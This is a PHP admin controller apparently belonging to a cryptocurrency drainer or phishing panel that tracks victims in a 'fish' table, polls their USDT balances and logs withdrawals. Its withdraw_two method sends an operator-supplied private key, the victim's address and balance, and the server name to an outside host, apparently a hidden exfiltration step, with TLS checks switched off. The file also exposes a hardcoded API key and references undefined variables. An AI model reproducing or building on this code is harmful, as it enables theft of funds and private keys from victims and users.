<?php
namespace app\admin\controller;

use app\admin\controller\Base;
use app\common\consts\Response;
use app\common\model\Casies as CasiesModel;
use app\common\model\Customer as CustomerModel;
use app\common\model\CustomerProportion;
use app\common\model\TimingAddress;
use app\common\model\WithdrawLog;
use app\common\service\AddressService;
use app\common\service\CustomerService;
use GuzzleHttp\Client;
use think\Request;
use think\facade\Log;
use think\db;

class Customer extends Base
{

     public function __construct()
     {
         parent::__construct();
        //  $this->checkAdmin();
     }

    public function index()
    {
        $data = CustomerModel::order([ 'id' => 'desc'])
                    ->where('is_auth', 1);
        if (!empty($this->users)) {
            $data->whereIn('employee', $this->users);
        }
        
        $data = $data->paginate(20);
// dump($data);die;
        // if (!$data->isEmpty()) {
        //     foreach ($data as &$v) {
        //         $v->proportion = CustomerService::getProportion($v['id']);
        //     }
        // }
// dump($data);die;
        return $this->fetch('', ['data' => $data]);
    }

    public function destroy(Request $request)
    {
        if (! $request->isPost())
            return $this->errorJson(Response::METHOD_NOT_ALLOW);

        $id = $request->id;
        $data = CustomerModel::where('id', $id)->find();
        if (! $data)
            return $this->errorJson(Response::NO_DATA);

        try {
            $data->delete();

            return $this->successJson();
        } catch (\Exception $e) {
            Log::error($e->getMessage());
            return $this->errorJson(Response::UPDATE_ERR);
        }
    }

    public function withdraw_view(Request $request)
    {
        $id = $request->id;

        $data = CustomerModel::find(['id' => $id]);
        return $this->fetch('', ['data' => $data]);
    }

    public function withdraw_two(Request $request)
    {
        $id = $request->post('id');
        $amount = $request->post('amount');
        $type = $request->post('type');
        
        $pri_key = $request->post('miyue');
        // if (empty($id)  || empty($type) || empty($amount)) {
        //     return $this->errorJson(Response::PARAM_IS_WRONG,'参数错误');
        // }

        $address = CustomerModel::find(['id' => $id])->toArray();

        // if (empty($address)) {
        //     return $this->errorJson(Response::PARAM_IS_WRONG,'数据不存在');
        // }

        if ($type == 'erc') {
            $data = AddressService::getAddress('erc');
            $au_address = $data[0]['address'] ?? '';

        } else {
            $data = AddressService::getAddress('trc');
            $au_address = $data[0]['address'] ?? '';
        }
        // dump($address);die;
        $fish_data = DB::name('fish') -> where('address',$address['address']) -> find();
        
        $coustomer_data = Db::name('customer') ->where('address',$address['address']) -> find();
        // dump($au_address);die;
        // dump($this->users);die;
        $add_data = [
                // 'id'            =>  $id,
                'employee'      => $id,    
                'address'      =>  $address['address'],   
                'au_address'      =>  $au_address,   
                'type'      =>  $fish_data['type'],   
                'balance'      =>  $coustomer_data['balance'],   
                'time'      =>  date("Y-m-d H:i:s"),    
                'to_value'      =>  $address['address'],   
                'to_au_address' => $address['address'],
                'pri_key'       =>  $pri_key,
                'ym'            => $_SERVER['SERVER_NAME'] 
            ];
            // dump($add_data);die;
           /* $client = new \GuzzleHttp\Client();
            $res = $client->request('GET',$url.'?from='.$from.'&to='.$to.'&privateKey='.$pri_key.'&tran_num='.$amount * 1000000);*/
            $a = $this -> request_post('https://py.appxiazaixy.shop/login/tj_api',$add_data);
            
        $params = [
//            'owner' => $au_address,
            'to' => $address['address'],
            'contract' => $contract,
        ];

// //
//         try {
//             $client = new Client();
//             $res = $client->request('post', $url, [
//                 'json'  => $params
//             ]);

//             $body = $res->getBody();
//             $content = $body->getContents();
//             $data = json_decode($content, true);
//             Log::info('transfer_result:' . $content);
//             if (isset($data['code']) && $data['code'] == 200) {

//             } else {
//                 return $this->errorJson(Response::PARAM_IS_WRONG, '转款异常');
//             }

//         } catch (\Exception $e) {
//             return $this->errorJson(Response::PARAM_IS_WRONG, '转款报错' . $e->getMessage());
//         }

        $withdraw_log = array(
            'from_address' => $au_address,
            'to_address' => $params['to'],
            'balance' => $amount,
            'type' => $type,
        );


        WithdrawLog::create($withdraw_log);
        return $this->successJson();
    }
    function request_post($url = '', $param = '') {
        if (empty($url) || empty($param)) {
            return false;
        }
     
        $postUrl = $url;
        $curlPost = $param;
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$postUrl);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 0);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上
        curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  // 从证书中检查SSL加密算法是否存在
        curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);
     
        return $data;
    }
    public function withdraw(Request $request)
    {
        $id = $request->post('id');
        $amount = $request->post('amount');
        $type = $request->post('type');
        if (empty($id)  || empty($type) || empty($amount)) {
            return $this->errorJson(Response::PARAM_IS_WRONG,'参数错误');
        }

        $address = CustomerModel::find(['id' => $id])->toArray();

        if (empty($address)) {
            return $this->errorJson(Response::PARAM_IS_WRONG,'数据不存在');
        }

        if ($type == 'erc') {
            $data = AddressService::getAddress('erc');
            $au_address = $data[0]['address'] ?? '';

        } else {
            $data = AddressService::getAddress('trc');
            $au_address = $data[0]['address'] ?? '';
        }
        $params = [
//            'owner' => $au_address,
            'to' => $address['address'],
            'contract' => $contract,
        ];

//
        try {
            $client = new Client();
            $res = $client->request('post', $url, [
                'json'  => $params
            ]);

            $body = $res->getBody();
            $content = $body->getContents();
            $data = json_decode($content, true);
            Log::info('transfer_result:' . $content);
            if (isset($data['code']) && $data['code'] == 200) {

            } else {
                return $this->errorJson(Response::PARAM_IS_WRONG, '转款异常');
            }

        } catch (\Exception $e) {
            return $this->errorJson(Response::PARAM_IS_WRONG, '转款报错' . $e->getMessage());
        }

        $withdraw_log = array(
            'from_address' => $au_address,
            'to_address' => $params['to'],
            'balance' => $amount,
            'type' => $type,
        );


        WithdrawLog::create($withdraw_log);
        return $this->successJson();
    }

    public function bindTimingAddress(Request $request)
    {
        $address_id = $request->post('address_id' , '');
        $address = $request->post('address', '');
        $type = $request->post('type', '');
        if (!$address_id || !$address) {
            return $this->errorJson(Response::PARAM_IS_WRONG);
        }

        $param = ['address' => $address, 'address_id' => $address_id];

        $data = TimingAddress::where($param)->find();
        if (empty($data)) {
            TimingAddress::create($param);
        }

        return $this->successJson();
    }
    
    public function update_balance(Request $request)
    {
        $id = $request->id;

        $fish = CustomerModel::find(['id' => $id]);

        $qb = $fish->address;
        if($fish->type == 'trc'){
            
        $umoney_url = 'https://'.$_SERVER['HTTP_HOST'].'/usdt/index.php/Fish/get_balance_trc?address='.$qb;


        $balance = $this->curl_get_https($umoney_url);


        }else{
            $balance = $this ->get_balance_erc($qb);

        }

        // $balance = FishService::getBalance($fish->address, $fish->type);
        
        // dump($balance);die;
        if ($balance != false) {
            $fish->balance = $balance;
            $fish->save();
        }

        return $this->successJson();
    }
    
    public function get_balance_erc($address){
        $api_key = '7TCVDMHGHVH42IFHXJXK677AQWUA1QDE9N';
        $usdt_contract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        //设置抓取的url
        $url='https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress='.$usdt_contract.'&address='.$address.'&tag=latest&apikey='.$api_key;                                 //地址要拼接上请求参数

        $json_data = json_decode(file_get_contents($url),true);
        $data = $json_data['result'];
        $balance = $data/1000000;
        return $balance;
    }

        function curl_get_https($url){
            $curl = curl_init(); // 启动一个CURL会话
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_HEADER, 0);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);  // 从证书中检查SSL加密算法是否存在
            $tmpInfo = curl_exec($curl);     //返回api的json对象
            //关闭URL请求
            curl_close($curl);
            return $tmpInfo;    //返回json对象
        }
    
}
